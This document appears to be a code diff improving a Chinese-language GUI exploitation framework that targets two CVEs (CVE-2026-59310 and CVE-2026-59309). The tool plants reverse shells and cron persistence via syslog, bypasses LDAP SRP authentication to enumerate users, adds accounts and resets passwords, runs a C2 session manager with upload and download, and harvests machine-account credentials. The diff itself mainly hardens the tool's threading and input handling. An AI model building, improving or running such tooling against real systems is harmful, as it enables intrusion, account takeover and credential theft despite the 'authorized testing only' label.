@@ -2,9 +2,13 @@
 
 页签：①目标与指纹 ②CVE-2026-59310 ③CVE-2026-59309 ④C2/反弹Shell
       ⑤后渗透 ⑥清理中心 ⑦检测与加固
+
+线程约定：tkinter 非线程安全 —— 后台线程（run_bg 的 work）只做网络/计算
+并通过 self.log()/self.root.after() 触碰 UI；所有 UI 写操作必须在主线程。
 """
 import base64
 import csv
+import os
 import queue
 import threading
 import time
@@ -53,6 +57,7 @@ class ToolApp:
         self.cur_sess = None
         self._build_style()
         self._build_ui()
+        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
         self.root.after(120, self._poll_log)
         self.root.after(1000, self._poll_sessions)
         self.log("[i] 就绪。本工具仅用于授权渗透测试 / 漏洞验证。", "i")
@@ -124,17 +129,17 @@ class ToolApp:
                   style="Muted.TLabel").pack(side="right")
         ttk.Label(head, text="仅限授权测试 ·", style="Muted.TLabel").pack(side="right")
 
-        nb = ttk.Notebook(self.root)
-        nb.pack(fill="both", expand=True, padx=10, pady=(8, 0))
+        self.nb = ttk.Notebook(self.root)
+        self.nb.pack(fill="both", expand=True, padx=10, pady=(8, 0))
         tabs = []
         for _ in range(7):
-            tabs.append(ttk.Frame(nb))
+            tabs.append(ttk.Frame(self.nb))
         self.tab_target, self.tab_59310, self.tab_59309, self.tab_shell, \
             self.tab_postex, self.tab_clean, self.tab_detect = tabs
         for w, name in zip(tabs, (" ① 目标与指纹 ", " ② CVE-2026-59310 利用 ",
                                   " ③ CVE-2026-59309 利用 ", " ④ C2 / 反弹 Shell ",
                                   " ⑤ 后渗透 ", " ⑥ 清理中心 ", " ⑦ 检测与加固 ")):
-            nb.add(w, text=name)
+            self.nb.add(w, text=name)
 
         self.cur_target = tk.StringVar()
         self.http_proxy = tk.StringVar()
@@ -205,10 +210,18 @@ class ToolApp:
         return f, tv
 
     def _busy(self, text):
-        self.status_var.set("● " + text)
+        self.root.after(0, self.status_var.set, "● " + text)
 
     def _idle(self):
-        self.status_var.set("● 就绪")
+        self.root.after(0, self.status_var.set, "● 就绪")
+
+    def _on_close(self):
+        self.stop_flag.set()
+        try:
+            self.c2m.shutdown()
+        except Exception:
+            pass
+        self.root.destroy()
 
     def run_bg(self, fn, name="任务"):
         def wrap():
@@ -276,25 +289,31 @@ class ToolApp:
             return
         existing = {self.scan_tree.item(i, "values")[0].split(":")[0]
                     for i in self.scan_tree.get_children()}
+        added = 0
         for part in h.replace(";", ",").split(","):
             part = part.strip()
             if part and part.split(":")[0] not in existing:
                 self.scan_tree.insert("", "end",
                                       values=(part, "", "", "", "", "", "", "", "", "", "", ""))
-
+                added += 1
         self.tgt_input.set("")
+        if added:
+            self.log("[+] 已添加 %d 个目标" % added, "m")
 
     def _tgt_import(self):
         fn = filedialog.askopenfilename(filetypes=[("文本", "*.txt"), ("所有", "*.*")])
         if not fn:
             return
         with open(fn, encoding="utf-8", errors="replace") as fp:
+            n = 0
             for line in fp:
                 line = line.strip()
                 if line and not line.startswith("#"):
                     self.tgt_input.set(line)
+                    before = len(self.scan_tree.get_children())
                     self._tgt_add()
-        self.log("[+] 目标列表已导入", "+")
+                    n += len(self.scan_tree.get_children()) - before
+        self.log("[+] 目标列表已导入 %d 个" % n, "+")
 
     def _tgt_del(self):
         for s in self.scan_tree.selection():
@@ -330,10 +349,13 @@ class ToolApp:
                         "●" if r["389"] else "", "●" if r["636"] else "",
                         "●" if r["2020"] else "",
                         r["api"] or "", r["mechs"] or "", r["nc"] or "", r["conclusion"])
-                for iid in self.scan_tree.get_children():
-                    if self.scan_tree.item(iid, "values")[0].split(":")[0] == h:
-                        self.scan_tree.item(iid, values=vals)
-                        break
+
+                def _upd(vals=vals, h=h):
+                    for iid in self.scan_tree.get_children():
+                        if self.scan_tree.item(iid, "values")[0].split(":")[0] == h:
+                            self.scan_tree.item(iid, values=vals)
+                            break
+                self.root.after(0, _upd)
                 self.log("[+] %s → %s" % (h, r["conclusion"]), "+")
             self.log("[*] 批量指纹完成", "+")
         self.run_bg(work, "批量指纹")
@@ -438,6 +460,7 @@ class ToolApp:
                    command=self._b310_rce_readback).pack(side="left")
         ttk.Button(bb, text="仅植入（输出落目标 /tmp）",
                    command=self._b310_rce_plain).pack(side="left", padx=6)
+        ttk.Button(bb, text="取消轮询", command=self.stop_flag.set).pack(side="left")
         self.v510_out = tk.Text(right, height=8, bg=COLORS["term"], fg=COLORS["termfg"],
                                 relief="flat", font=("Consolas", 9))
         self.v510_out.pack(fill="both", expand=True, pady=4)
@@ -475,7 +498,11 @@ class ToolApp:
 
     def _510_net(self):
         host = self.v59310_host.get().strip().split(":")[0]
-        port = int(self.v510_port.get() or 514)
+        try:
+            port = int(self.v510_port.get() or 514)
+        except ValueError:
+            messagebox.showwarning("提示", "syslog 端口需为数字")
+            return None, 514, False, False
         proto = self.v510_proto.get()
         return host, port, proto in ("TCP", "TLS"), proto == "TLS"
 
@@ -532,7 +559,12 @@ class ToolApp:
             messagebox.showwarning("提示", "命令不能包含换行")
             return
         tag = rand_name(6)
-        vport = int(self.v510_vport.get() or 5480)
+        try:
+            vport = int(self.v510_vport.get() or 5480)
+        except ValueError:
+            messagebox.showwarning("提示", "VAMI 端口需为数字")
+            return
+        self.stop_flag.clear()
         proxy = self.http_proxy.get().strip() or None
 
         def work():
@@ -544,8 +576,11 @@ class ToolApp:
                                     stop_flag=self.stop_flag)
             if ok:
                 self.log("[+] 命令输出已取回（%d 字节）" % len(text), "+")
-                self.v510_out.delete("1.0", "end")
-                self.v510_out.insert("1.0", text)
+
+                def _show(text=text):
+                    self.v510_out.delete("1.0", "end")
+                    self.v510_out.insert("1.0", text)
+                self.root.after(0, _show)
                 self.record("59310-RCE", host, cmd[:80],
                             "rm -f /opt/vmware/share/htdocs/r%s.txt "
                             "/etc/cron.d/cve59310%s*" % (tag, tag))
@@ -582,20 +617,25 @@ class ToolApp:
     def _b310_revshell(self):
         host, port, tcp, tls = self._510_net()
         lhost = self.v510_lhost.get().strip()
-        lport = int(self.v510_lport.get() or 4444)
-        method = self.v510_rmethod.get()
         if not host or not lhost:
             messagebox.showwarning("提示", "需要目标与 LHost")
             return
+        try:
+            lport = int(self.v510_lport.get() or 4444)
+        except ValueError:
+            messagebox.showwarning("提示", "LPort 需为数字")
+            return
+        method = self.v510_rmethod.get()
 
         def work():
             planted, _ = plant_revshell(host, port, lhost, lport, method,
                                         tcp=tcp, tls=tls)
             self.log("[+] 已植入反弹 %s:%d → %s" % (lhost, lport, planted), "+")
             self.record("59310-反弹植入", host, "%s:%d" % (lhost, lport),
-                        "rm -f /etc/cron.d/cve59310*" )
+                        "rm -f /etc/cron.d/cve59310*-syslog.log")
             self.root.after(0, lambda: self._c2_add_listener(lport))
-            self.log("[i] 已在 ④ 页启动监听 %d，等待 crond 触发回连（约 60s）" % lport, "m")
+            self.root.after(0, lambda: self.nb.select(self.tab_shell))
+            self.log("[i] 已切换到 ④ 页并请求监听 %d；crond 约 60s 触发回连" % lport, "m")
         self.run_bg(work, "反弹植入")
 
     def _b310_webshell(self):
@@ -753,14 +793,19 @@ class ToolApp:
         def work():
             self.log("[*] rootDSE 探测 %s:%d …" % (host, port), "i")
             dse = root_dse_probe(host, port, tls, 8)
-            self.log("[+] SASL 机制: %s" % (",".join(dse["mechs"]) or "(无)"), "+")
-            self.log("[+] namingContexts: %s" % (";".join(dse["nc"]) or "(无)"), "+")
-            if dse["nc"] and not self.v590_cbase.get():
-                self.v590_cbase.set(dse["nc"][0])
-            if "SRP" in dse["mechs"]:
-                self.log("[+] 通告 SRP 机制 → CVE-2026-59309 攻击面暴露", "+")
-            else:
-                self.log("[!] 未通告 SRP 机制（可能已修复/禁用，或需认证读 rootDSE）", "!")
+            mechs, ncs = dse["mechs"], dse["namingContexts"]
+
+            def _show(mechs=mechs, ncs=ncs):
+                self.log("[+] SASL 机制: %s" % (",".join(mechs) or "(无)"), "+")
+                self.log("[+] namingContexts: %s" % (";".join(ncs) or "(无)"), "+")
+                if "SRP" in mechs:
+                    self.log("[+] 通告 SRP 机制 → CVE-2026-59309 攻击面暴露", "+")
+                else:
+                    self.log("[!] 未通告 SRP 机制（可能已修复/禁用，或需认证读 rootDSE）",
+                             "!")
+                if ncs and not self.v590_cbase.get():
+                    self.v590_cbase.set(ncs[0])
+            self.root.after(0, _show)
         self.run_bg(work, "SRP探测")
 
     def _b309_bypass(self):
@@ -810,10 +855,12 @@ class ToolApp:
         self.run_bg(work, "认证绕过")
 
     def _309_conn(self):
+        """返回 (conn, host)；未绕过时返回 (None, host) 并提示。"""
         host = self.v590_host.get().strip().split(":")[0]
         conn = self.srp_conns.get(host)
         if conn is None:
-            raise RuntimeError("请先在该目标上执行认证绕过")
+            self.log("[!] 请先在该目标上执行“认证绕过”", "!")
+            return None, host
         return conn, host
 
     def _309_fill_tree(self, entries):
@@ -826,23 +873,29 @@ class ToolApp:
     def _b309_users(self):
         def work():
             conn, _host = self._309_conn()
+            if conn is None:
+                return
             base = self.v590_cbase.get().strip()
             if not base:
-                raise RuntimeError("Base DN 为空（先执行绕过或探测）")
+                self.log("[!] Base DN 为空（先执行绕过或探测）", "!")
+                return
             conn.send_op(op_search("cn=Users," + base, scope=2,
                                    ffilter="(objectClass=person)",
                                    attrs=["cn", "sAMAccountName", "userPrincipalName"]))
             entries, code = collect_search(conn)
             self.log("[+] 枚举到 %d 个用户对象 (code=%s)" % (len(entries), code), "+")
-            self._309_fill_tree(entries)
+            self.root.after(0, lambda: self._309_fill_tree(entries))
         self.run_bg(work, "枚举用户")
 
     def _b309_admins(self):
         def work():
             conn, _host = self._309_conn()
+            if conn is None:
+                return
             base = self.v590_cbase.get().strip()
             if not base:
-                raise RuntimeError("Base DN 为空")
+                self.log("[!] Base DN 为空（先执行绕过或探测）", "!")
+                return
             conn.send_op(op_search("cn=Administrators,cn=Builtin," + base, scope=0,
                                    ffilter="(objectClass=*)",
                                    attrs=["member", "cn", "description"]))
@@ -852,7 +905,7 @@ class ToolApp:
                 for m in at.get("member", []):
                     self.log("[admin] %s" % m, "+")
                     n += 1
-            self._309_fill_tree(entries)
+            self.root.after(0, lambda: self._309_fill_tree(entries))
             self.log("[+] 管理员组读取完成（%d 成员）" % n, "+")
         self.run_bg(work, "管理员组")
 
@@ -861,9 +914,12 @@ class ToolApp:
 
         def work():
             conn, host = self._309_conn()
+            if conn is None:
+                return
             base = self.v590_cbase.get().strip()
             if not base:
-                raise RuntimeError("Base DN 为空")
+                self.log("[!] Base DN 为空（先执行绕过或探测）", "!")
+                return
             user = self.v590_newuser.get().strip()
             pw = self.v590_newpass.get()
             if not _re.fullmatch(r"[A-Za-z0-9_.-]{3,32}", user):
@@ -901,6 +957,8 @@ class ToolApp:
     def _b309_resetpw(self):
         def work():
             conn, host = self._309_conn()
+            if conn is None:
+                return
             dn = self.v590_rstuser.get().strip()
             pw = self.v590_rstpass.get()
             conn.send_op(op_modify(dn, [(2, "userPassword", [pw])]))
@@ -918,7 +976,12 @@ class ToolApp:
     def _b309_console(self):
         def work():
             conn, _host = self._309_conn()
+            if conn is None:
+                return
             base = self.v590_cbase.get().strip()
+            if not base:
+                self.log("[!] Base DN 为空（先执行绕过或探测）", "!")
+                return
             scope = {"base": 0, "one": 1, "sub": 2}[self.v590_cscope.get()]
             filt = self.v590_cfilter.get().strip() or "(objectClass=*)"
             conn.send_op(op_search(base, scope=scope, ffilter=filt, attrs=["*"]))
@@ -928,8 +991,12 @@ class ToolApp:
                 lines.append("DN: " + dn)
                 for k in sorted(at):
                     lines.append("  %s: %s" % (k, "; ".join(at[k][:5])))
-            self.v590_ctext.delete("1.0", "end")
-            self.v590_ctext.insert("1.0", "\n".join(lines) or "(空结果)")
+            text = "\n".join(lines) or "(空结果)"
+
+            def _show(text=text):
+                self.v590_ctext.delete("1.0", "end")
+                self.v590_ctext.insert("1.0", text)
+            self.root.after(0, _show)
             self.log("[+] 查询完成: %d 条 (code=%s)" % (len(entries), code), "+")
         self.run_bg(work, "LDAP查询")
 
@@ -1004,7 +1071,7 @@ class ToolApp:
         self.up_remote = tk.StringVar(value="/tmp/uploaded")
         ttk.Entry(fbar, textvariable=self.up_remote, width=18).pack(side="left", padx=2)
         ttk.Button(fbar, text="上传", command=self._c2_upload).pack(side="left")
-        ttk.Button(fbar, text="下载(左右互换路径)", command=self._c2_download).pack(
+        ttk.Button(fbar, text="下载（远端→本地）", command=self._c2_download).pack(
             side="left", padx=6)
 
     def _c2_add_listener_ui(self):
@@ -1058,10 +1125,7 @@ class ToolApp:
         s = self._c2_selected()
         if s:
             self.cur_sess = s
-            self.term.configure(state="normal")
-            self.term.insert("end", "\n== 会话 #%d (%s) ==\n" % (s.id, s.addr))
-            self.term.see("end")
-            self.term.configure(state="normal")
+            self._term_append("== 会话 #%d (%s) ==" % (s.id, s.addr))
             self.log("[i] 当前交互会话 → #%d" % s.id, "m")
 
     def _c2_probe(self):
@@ -1086,17 +1150,20 @@ class ToolApp:
 
     def _shell_send(self):
         cmd = self.shell_cmd.get()
-        self.shell_cmd.set("")
         s = self.cur_sess or self._c2_selected()
         if not s:
             self.log("[!] 无会话（先监听并等回连，双击会话行）", "!")
             return
+        self.shell_cmd.set("")
         self.term.configure(state="normal")
         self.term.insert("end", "\n#%d> %s\n" % (s.id, cmd))
         self.term.see("end")
 
         def work():
-            out = s.read_until_quiet(maxwait=15)
+            try:
+                out = self.c2m.exec(s.id, cmd, timeout=15)
+            except (RuntimeError, OSError) as e:
+                out = "[!] %s\n" % e
             self.root.after(0, lambda: self._term_append(out))
             if not s.alive:
                 self.root.after(0, lambda: self._term_append("[!] 会话已断开\n"))
@@ -1114,13 +1181,21 @@ class ToolApp:
             messagebox.showwarning("提示", "需要会话与两侧路径")
             return
 
+        if not os.path.isfile(local):
+            messagebox.showwarning("提示", "本地文件不存在: %s" % local)
+            return
+
         def work():
             self.log("[*] 上传 %s → %s（会话 #%d）" % (local, remote, s.id), "i")
 
             def prog(i, t):
-                self.log("  [上传 %d/%d]" % (i, t), "m")
-            out = self.c2m.upload(s.id, local, remote, progress=prog)
-            self.log("[+] %s" % out, "+")
+                if t <= 5 or i % max(1, t // 10) == 0 or i == t:
+                    self.log("  [上传 %d/%d]" % (i, t), "m")
+            try:
+                out = self.c2m.upload(s.id, local, remote, progress=prog)
+                self.log("[+] %s" % out, "+")
+            except (RuntimeError, OSError) as e:
+                self.log("[!] 上传失败: %s" % e, "!")
         self.run_bg(work, "上传")
 
     def _c2_download(self):
@@ -1152,6 +1227,10 @@ class ToolApp:
             ttk.Button(bf, text=name, width=22,
                        command=lambda k=key: self._postex(k)).grid(
                 row=i // 4, column=i % 4, padx=4, pady=2)
+        ttk.Label(bf, text="传输参数取自 ② 页（syslog 端口/协议/VAMI 端口）",
+                  style="Muted.TLabel").grid(row=(len(POSTEX_ACTIONS) + 3) // 4,
+                                             column=0, columnspan=4, sticky="w",
+                                             padx=4)
 
         cf = ttk.LabelFrame(f, text="自定义命令（单行，输出经 VAMI 回显取回）")
         cf.grid(row=2, column=0, sticky="ew", pady=4)
@@ -1199,8 +1278,11 @@ class ToolApp:
                 self.log("[!] %s" % text, "!")
                 return
             self.log("[+] %s 输出已取回" % name, "+")
-            self.postex_out.delete("1.0", "end")
-            self.postex_out.insert("1.0", text)
+
+            def _show(text=text):
+                self.postex_out.delete("1.0", "end")
+                self.postex_out.insert("1.0", text)
+            self.root.after(0, _show)
             if key == "machine-creds":
                 self.creds["机器账户@%s" % host] = text.strip()[:600]
                 self.log("[+] 机器账户凭据已存入会话记录", "+")
@@ -1273,7 +1355,10 @@ class ToolApp:
         t = tk.Text(f, bg=COLORS["term"], fg=COLORS["fg"], relief="flat",
                     font=("Consolas", 9))
         t.grid(row=1, column=0, sticky="nsew", pady=4)
-        t.insert("1.0", DETECTION_TEXT)
+        from .data import ABOUT_TEXT, REFERENCES
+        refs = "\n".join("- %s: %s" % (n, u) for n, u in REFERENCES)
+        t.insert("1.0", ABOUT_TEXT + "\n\n" + DETECTION_TEXT +
+                 "\n\n【参考链接】\n" + refs)
         t.configure(state="disabled")
 
 
